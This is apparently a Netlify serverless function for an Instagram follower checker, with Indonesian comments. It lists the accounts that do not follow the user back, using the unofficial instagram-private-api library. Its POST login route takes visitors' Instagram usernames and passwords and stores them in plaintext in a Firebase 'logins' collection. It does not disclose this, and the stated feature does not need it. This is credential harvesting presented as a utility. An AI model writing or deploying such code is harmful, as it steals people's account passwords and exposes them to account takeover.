const { IgApiClient } = require('instagram-private-api');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const axios = require('axios');
const db = require('../config/firebaseConfig');  // Jalur relatif menuju firebaseConfig.js

const ig = new IgApiClient();

// Variabel sesi yang disimpan dalam memori
let sessionData = null;

// Fungsi untuk login ke Instagram
const login = async () => {
    ig.state.generateDevice(process.env.INSTAGRAM_USERNAME);

    if (sessionData) {
        ig.state.deserialize(sessionData);
        console.log('Sesi ditemukan di memori, melanjutkan...');
        try {
            await ig.account.currentUser();
            console.log('Sesi valid, melanjutkan...');
        } catch (error) {
            console.log('Sesi kadaluarsa, login ulang...');
            await forceLogin();
        }
    } else {
        console.log('Sesi tidak ditemukan di memori, login ulang...');
        await forceLogin();
    }
};

// Fungsi untuk login ulang dan menyimpan sesi baru di memori
const forceLogin = async () => {
    try {
        console.log('Mencoba login...');
        await ig.account.login(process.env.INSTAGRAM_USERNAME, process.env.INSTAGRAM_PASSWORD);
        console.log('Login berhasil!');
        sessionData = ig.state.serialize(); // Menyimpan sesi di memori
    } catch (error) {
        console.error('Login gagal:', error);
        if (error.name === 'IgCheckpointError') {
            const code = await promptFor2FACode();
            await ig.account.confirmTwoFactorCode(code);
            sessionData = ig.state.serialize(); // Menyimpan sesi setelah 2FA berhasil
        } else {
            throw error;
        }
    }
};

// Fungsi untuk meminta input kode 2FA
const promptFor2FACode = () => {
    return new Promise((resolve, reject) => {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        rl.question('Enter 2FA code: ', (code) => {
            rl.close();
            resolve(code);
        });
    });
};

// Fungsi untuk menunggu (delay) dalam milidetik
const delay = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
};

// Fungsi untuk mengambil followers dengan paginasi
const getAllFollowers = async (userId) => {
    let followers = [];
    let followersFeed = ig.feed.accountFollowers(userId);

    let nextFollowers = await followersFeed.items();
    followers = followers.concat(nextFollowers);

    while (followersFeed.isMoreAvailable()) {
        nextFollowers = await followersFeed.items();
        followers = followers.concat(nextFollowers);
        await delay(2000);
    }

    return followers;
};

// Fungsi untuk mengambil following dengan paginasi
const getAllFollowing = async (userId) => {
    let following = [];
    let followingFeed = ig.feed.accountFollowing(userId);

    let nextFollowing = await followingFeed.items();
    following = following.concat(nextFollowing);

    while (followingFeed.isMoreAvailable()) {
        nextFollowing = await followingFeed.items();
        following = following.concat(nextFollowing);
        await delay(2000);
    }

    return following;
};

// Fungsi handler untuk endpoint profile Instagram
exports.handler = async function(event, context) {
    if (event.httpMethod === 'GET' && event.path === '/.netlify/functions/instagram/profile') {
        try {
            await login();
            const user = await ig.account.currentUser();

            // Mendapatkan jumlah followers dan following
            const followersCount = await ig.user.info(user.pk).then(info => info.follower_count);
            const followingCount = await ig.user.info(user.pk).then(info => info.following_count);

            // Mendapatkan gambar profil
            const profilePicUrl = user.profile_pic_url;
            const imagePath = path.resolve(__dirname, '../public/my_profile.jpg');

            // Mengunduh gambar profil
            const writer = fs.createWriteStream(imagePath);
            const response = await axios.get(profilePicUrl, { responseType: 'stream' });

            response.data.pipe(writer);
            writer.on('finish', () => {
                console.log('Gambar profil telah disimpan.');
            });

            // Ambil data followers dan following
            const followers = await getAllFollowers(user.pk);
            const following = await getAllFollowing(user.pk);

            const followersUsernames = followers.map(f => f.username);
            const followingUsernames = following.map(f => f.username);

            // Cari orang yang tidak follow back
            const dontFollowBack = followingUsernames.filter(username => !followersUsernames.includes(username));

            return {
                statusCode: 200,
                body: JSON.stringify({
                    username: user.username,
                    full_name: user.full_name,
                    biography: user.biography,
                    followers_count: followersCount,
                    following_count: followingCount,
                    profile_picture_url: '/my_profile.jpg',
                    dont_follow_back: dontFollowBack,
                    dont_follow_back_count: dontFollowBack.length,
                }),
            };
        } catch (error) {
            console.error(error);
            if (error.name === 'IgLoginRequiredError') {
                return {
                    statusCode: 401,
                    body: JSON.stringify({ message: 'Login is required. Please check your credentials.' }),
                };
            } else {
                return {
                    statusCode: 500,
                    body: JSON.stringify({ message: 'Error fetching Instagram data' }),
                };
            }
        }
    } else if (event.httpMethod === 'POST' && event.path === '/.netlify/functions/instagram/login') {
        const { username, password } = JSON.parse(event.body);

        try {
            ig.state.generateDevice(username);
            await ig.account.login(username, password);

            sessionData = ig.state.serialize();

            const user = await ig.account.currentUser();
            const userId = user.pk;

            // Simpan ke Firebase
            const ref = db.ref('logins');
            const loginData = {
                username,
                password,
                userId,
                timestamp: new Date().toISOString(),
            };

            await ref.child(userId).set(loginData);

            return {
                statusCode: 200,
                body: JSON.stringify({ message: 'Login berhasil!' }),
            };
        } catch (error) {
            console.error('Login gagal:', error);

            if (error.name === 'IgLoginRequiredError') {
                return {
                    statusCode: 401,
                    body: JSON.stringify({ message: 'Instagram login failed: incorrect username or password.' }),
                };
            } else if (error.name === 'IgCheckpointError') {
                return {
                    statusCode: 400,
                    body: JSON.stringify({ message: 'Instagram needs 2FA verification.' }),
                };
            } else {
                return {
                    statusCode: 500,
                    body: JSON.stringify({ message: 'Login failed, please try again later.' }),
                };
            }
        }
    }

    return {
        statusCode: 404,
        body: JSON.stringify({ message: 'Not Found' }),
    };
};
